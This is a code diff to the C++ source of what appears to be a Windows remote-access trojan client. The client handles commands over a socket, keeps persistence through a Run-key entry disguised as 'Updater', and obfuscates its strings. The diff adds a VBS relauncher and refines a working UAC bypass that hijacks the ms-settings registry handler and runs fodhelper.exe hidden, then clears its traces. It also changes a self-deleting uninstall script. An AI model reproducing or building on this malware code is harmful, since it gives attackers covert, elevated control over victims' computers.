@@ -169,13 +169,13 @@ void Uninstall()
 	ru.RegDelKey("SOFTWARE\\Windows Update");
 	ru.RegDelValue(AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater");
 
-	RemoveVBS = "WScript.Sleep 5000\n";
-	RemoveVBS = "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
-	RemoveVBS = "filesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\n";
-	RemoveVBS = "filesys.DeleteFile \"" + du.GetModuleFilePath() + "Remove.vbs\"";
+	RemoveVBS += "WScript.Sleep 5000\n";
+	RemoveVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
+	RemoveVBS += "filesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\n";
+	RemoveVBS += "filesys.DeleteFile \"" + du.GetModuleFilePath() + "Remove.vbs\"";
 
 	du.WriteFile(du.GetModuleFilePath() + "Remove.vbs", RemoveVBS);
-	su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Remove.vbs\"");
+	du.RunFile(du.GetModuleFilePath() + "Remove.vbs");
 }
 
 void RestartClient()
@@ -648,10 +648,21 @@ bool BypassUAC(SOCKET Sock)
 	DirUtils du;
 	RegUtils ru;
 	SystemUtils su;
+
+	string EmergencyVBS = "WScript.Sleep 5000\n";
+	EmergencyVBS += "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n";
+	EmergencyVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
+	EmergencyVBS += "WshShell.Run \"\"\"" + du.GetFullModuleFilePath() + "\"\"\", 1, false\n";
+	EmergencyVBS += "filesys.DeleteFile \"" + du.GetModuleFilePath() + "Emer.vbs\"";
 	
+	du.WriteFile(du.GetModuleFilePath() + "Emer.vbs", EmergencyVBS);
+	du.WriteFile(du.GetModuleFilePath() + "Aele");
+
+	du.RunFile(du.GetModuleFilePath() + "Emer.vbs");
+
 	if(!ru.RegMakeKey(AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command")))
 		Success = false;
-	if(!ru.RegWrite(AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command"), "", REG_SZ, AY_OBFUSCATE("cmd /c start \"\" \"") + du.GetFullModuleFilePath() + "\""))
+	if(!ru.RegWrite(AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command"), "", REG_SZ, ((string)AY_OBFUSCATE("cmd /c start \"\" \"") + du.GetFullModuleFilePath() + "\"").c_str()))
 		Success = false;
 	if(!ru.RegMakeKey(AY_OBFUSCATE("Software\\Classes\\ms-settings\\CurVer")))
 		Success = false;
@@ -659,17 +670,19 @@ bool BypassUAC(SOCKET Sock)
 		Success = false;
 	
 	if (Success)
-		su.AsyncCMD(AY_OBFUSCATE("powershell Start-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden"));
+		su.AsyncCMD((string)AY_OBFUSCATE("powershell Start-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden"));
 	
 	Sleep(3000);
 	
-	ru.RegDelKey(AY_OBFUSCATE("Software\Classes\ms-settings"));
-	ru.RegDelKey(AY_OBFUSCATE("Software\\Classes\\.pwn"));
+	ru.RegDelKey(AY_OBFUSCATE("Software\\Classes\\ms-settings\\CurVer"));
+	ru.RegDelKey(AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command"));
 	
-	if (du.CheckFile(du.GetModuleFilePath() + "Elevated"))
+	du.WriteFile(du.GetModuleFilePath() + "AeleSA");
+
+	if (du.CheckFile(du.GetModuleFilePath() + "AeleOK"))
 	{
-		du.DelFile(du.GetModuleFilePath() + "Elevated")
 		TcpIP::SendString(Sock, "OK");
+		Sleep(500);
 		return true;
 	}
 	
@@ -737,7 +750,7 @@ short Sessione(TcpIP Client)
 		{
 			FileExplorer(Client.Sock);
 		}
-		else if (cmd == "bypassuac")
+		else if (cmd == (string)AY_OBFUSCATE("bypassuac"))
 		{
 			if (BypassUAC(Client.Sock))
 				return 1;
